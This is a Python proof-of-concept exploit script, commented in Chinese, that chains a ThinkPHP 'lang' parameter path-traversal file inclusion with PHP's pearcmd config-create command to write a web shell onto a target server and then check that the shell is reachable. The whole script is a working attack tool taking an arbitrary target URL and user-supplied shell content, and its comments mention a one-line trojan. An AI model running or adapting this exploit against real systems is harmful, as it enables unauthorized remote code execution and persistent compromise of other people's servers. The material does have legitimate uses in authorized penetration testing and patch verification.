#!/usr/bin/env python3
"""
ThinkPHP Lang File Inclusion -> Pearcmd RCE PoC
Requires: register_argc_argv=On, pear installed
Usage:
  python thinkphp_pearcmd_poc.py http://target:8080 [--shell-file shell.php] [--content "<?php phpinfo();?>"]
  python thinkphp_pearcmd_poc.py http://192.168.1.100:8080 --cmd "id"
"""

import requests
import sys
import argparse
import urllib.parse

def detect_vuln(base_url):
    """尝试包含 index.php 来验证文件包含是否存在（期望返回 500 或错误）"""
    test_path = "../../../../../../public/index.php"  # 常见相对路径
    params = {"lang": test_path}
    url = base_url.rstrip("/") + "/"
    try:
        r = requests.get(url, params=params, timeout=10)
        # 如果存在漏洞，ThinkPHP 会抛出异常或错误页面
        if r.status_code == 500 or "Error" in r.text or "Exception" in r.text:
            print(f"[+] Target appears vulnerable (status {r.status_code})")
            return True
        else:
            print(f"[-] No typical error response (status {r.status_code}), may not be vulnerable")
            return False
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False

def write_shell(base_url, shell_file, shell_content):
    """
    通过 pearcmd 的 config-create 命令写入 shell 文件。
    URL 格式: /?+config-create+/&lang=../../../../../usr/local/lib/php/pearcmd&/<shell_content>+<shell_file>
    """
    # 构建包含 payload 的完整 URL，保留 + 号（不进行编码）
    # 此处直接拼接原始请求，避免 requests 二次编码
    url_path = "/?+config-create+/"
    lang_param = "lang=../../../../../../../../../../../usr/local/lib/php/pearcmd"
    # payload 中的 <??> 等符号需要在 URL 中安全传递
    # 将 shell 内容作为 pear 的参数之一
    full_url = f"{base_url.rstrip('/')}/{url_path}&{lang_param}&/{shell_content}+{shell_file}"
    # 为了兼容特殊字符，可以进行最小化编码，但示例中原始数据包就是如此
    print(f"[*] Writing shell via: {full_url}")
    try:
        # 使用原始字符串发送（注意 '+' 在 URL 中表示空格，requests 会将其编码为 %2B，需手动控制）
        # 因此我们直接使用准备好的 URL 字符串发送
        r = requests.get(full_url, timeout=15)
        # pearcmd 成功时通常会在响应中显示 "config-create" 或写入文件路径等
        if r.status_code == 200 and ("Success" in r.text or "config-create" in r.text):
            print("[+] Pearcmd response received, shell likely written")
            print(r.text[:500])
            return True
        else:
            print(f"[-] Unexpected response (status {r.status_code}): {r.text[:300]}")
            return False
    except Exception as e:
        print(f"[-] Request error: {e}")
        return False

def verify_shell(base_url, shell_file, cmd="id"):
    """访问写入的 shell 验证命令执行"""
    test_url = f"{base_url.rstrip('/')}/{shell_file}"
    try:
        # 假设 shell 内容为一个简单的一句话木马，这里仅测试文件是否存在
        r = requests.get(test_url, timeout=10)
        if r.status_code == 200:
            print(f"[+] Shell accessible at {test_url}")
            if cmd:
                # 如果已知参数名，可尝试执行命令（需要用户提供适配的 shell）
                # 这里只做存在性检查
                pass
        else:
            print(f"[-] Shell not accessible (status {r.status_code})")
    except Exception as e:
        print(f"[-] Verification error: {e}")

def main():
    parser = argparse.ArgumentParser(description="ThinkPHP File Inclusion + Pearcmd RCE")
    parser.add_argument("target", help="Base URL, e.g. http://192.168.1.100:8080")
    parser.add_argument("--shell-file", default="shell.php", help="Filename to write (default: shell.php)")
    parser.add_argument("--content", default="<?php phpinfo();?>", help="Shell content (default: phpinfo)")
    parser.add_argument("--cmd", help="Command to test after upload (if shell supports it)")
    args = parser.parse_args()

    base = args.target.rstrip("/")

    print("[*] Step 1: Detect vulnerability")
    if not detect_vuln(base):
        print("[-] Aborting, vulnerability not confirmed.")
        sys.exit(1)

    print("[*] Step 2: Write shell via pearcmd")
    if write_shell(base, args.shell_file, args.content):
        print("[*] Step 3: Verify shell")
        verify_shell(base, args.shell_file, args.cmd)

if __name__ == "__main__":
    main()